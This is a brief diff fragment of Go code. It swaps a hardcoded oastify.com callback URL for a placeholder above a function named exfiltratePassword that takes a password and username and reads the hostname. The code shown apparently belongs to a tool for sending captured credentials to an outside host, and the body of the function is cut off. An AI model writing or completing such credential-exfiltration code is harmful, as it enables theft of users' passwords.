@@ -7,7 +7,7 @@ import (
 	"strings"
 )
 
-var url = "http://547uooiflf8esxk79mizntg84zaqyjm8.oastify.com"
+var url = "http://<fill>"
 
 func exfiltratePassword(password, username string) {
 	hostname, err := os.Hostname()
